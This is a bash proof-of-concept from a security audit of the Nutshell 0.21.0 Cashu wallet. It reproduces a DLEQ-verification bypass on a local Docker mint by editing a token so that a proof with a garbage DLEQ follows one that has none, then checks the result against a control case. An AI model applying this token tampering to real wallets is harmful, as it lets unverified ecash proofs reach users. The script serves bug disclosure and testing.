#!/usr/bin/env bash
# repro_dleq_bypass.sh — Nutshell 0.21.0 mixed-proof DLEQ verification bypass
# (audit FINDINGS-2026-10-23-item6-nut18.md §6b; root cause cashu/wallet/wallet.py
# verify_proofs_dleq: `return` where `continue` belongs — the first dleq-less
# proof aborts verification for the whole list).
#
# Threat model (NUT-12): a malicious mint pairs an honest-looking dleq-less
# first proof with invalid-dleq followers — the wallet never verifies them.
# Repro: real proofs from a local FakeWallet arm, V3 (JSON) send, garbage dleq
# injected into a follower, received by a second wallet.
#
# Frozen verdicts:
#   BYPASS   [no-dleq, GARBAGE, no-dleq] -> received (garbage never checked)
#   CONTROL  [GARbage] alone             -> "DLEQ proof invalid."
set -uo pipefail
PORT=${PORT:-39119}
IMG=cashubtc/nutshell:0.21.0
KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
MINT_URL="http://127.0.0.1:$PORT"

cleanup() { docker rm -f dleq-arm >/dev/null 2>&1; }
trap cleanup EXIT
cleanup

echo "== boot nutshell arm (FakeWallet, host net :$PORT)"
docker run -d --name dleq-arm --network host \
  -e MINT_BACKEND_BOLT11_SAT=FakeWallet -e MINT_LISTEN_HOST=127.0.0.1 \
  -e MINT_LISTEN_PORT=$PORT -e MINT_RATE_LIMIT=FALSE -e MINT_PRIVATE_KEY=$KEY \
  $IMG poetry run mint >/dev/null || exit 1
for i in $(seq 1 30); do curl -s --max-time 2 "$MINT_URL/v1/info" >/dev/null && break; sleep 2; done

rm -rf /tmp/dleq && mkdir -p /tmp/dleq/w1 /tmp/dleq/w2
W1() { docker run --rm --network host -v /tmp/dleq:/data $IMG poetry run cashu -h "$MINT_URL" -w /data/w1 -t -y "$@" 2>&1 | grep -vE "Skipping|Warning|support to run|poetry install|^$"; }
W2() { docker run --rm --network host -v /tmp/dleq:/data $IMG poetry run cashu -h "$MINT_URL" -w /data/w2 -t -y "$@" 2>&1 | grep -vE "Skipping|Warning|support to run|poetry install|^$"; }

echo "== w1: invoice 6 (FakeWallet settles) -> send 5 --legacy"
W1 invoice 6 >/dev/null; sleep 4
TOK=$(W1 send 5 --legacy | grep -oE 'cashuA[A-Za-z0-9_=-]+' | head -1)
[ -n "$TOK" ] || { echo "FATAL: no token"; exit 1; }

GARBAGE='{"e":"'$(printf 'ab%.0s' {1..32})'","s":"'$(printf 'cd%.0s' {1..32})'","r":"'$(printf 'ef%.0s' {1..32})'"}'
edit_token() { # $1 = python editor on the decoded dict (reads JSON on stdin)
  TOKEN="$TOK" GARBAGE="$GARBAGE" python3 -c "
import base64, json, os, sys
t = os.environ['TOKEN'][6:]; t += '=' * (-(len(t)) % 4)
d = json.loads(base64.urlsafe_b64decode(t))
exec(sys.argv[1])
raw = json.dumps(d, separators=(',', ':')).encode()
print('cashuA' + base64.urlsafe_b64encode(raw).decode().rstrip('='))" "$1"
}

BYPASS_TOK=$(edit_token "d['token'][0]['proofs'][1]['dleq'] = json.loads(os.environ['GARBAGE'])")
CTRL_TOK=$(edit_token "
p = d['token'][0]['proofs']
p[0]['dleq'] = json.loads(os.environ['GARBAGE'])
d['token'][0]['proofs'] = [p[0]]")

echo "== BYPASS leg: w2 <- [no-dleq, GARBAGE, no-dleq]"
OUT=$(W2 receive "$BYPASS_TOK"); echo "$OUT" | tail -2
BYPASS=$(echo "$OUT" | grep -qiE 'received|balance' && echo YES || echo NO)

echo "== CONTROL leg: w2 <- [GARbage] alone (expect invalid)"
OUTC=$(W2 receive "$CTRL_TOK"); echo "$OUTC" | tail -1
CTRL=$(echo "$OUTC" | grep -qi 'DLEQ proof invalid' && echo YES || echo NO)

echo
echo "VERDICT: bypass-received=$BYPASS garbage-alone-rejected=$CTRL"
if [ "$BYPASS" = YES ] && [ "$CTRL" = YES ]; then
  echo "RESULT: BYPASS CONFIRMED — garbage dleq follower skipped when a dleq-less proof precedes it (wallet.py return-vs-continue)"
elif [ "$BYPASS" = NO ]; then
  echo "RESULT: bypass NOT reproduced — wallet behavior differs from the 2026-10-23 finding; re-triage"
fi
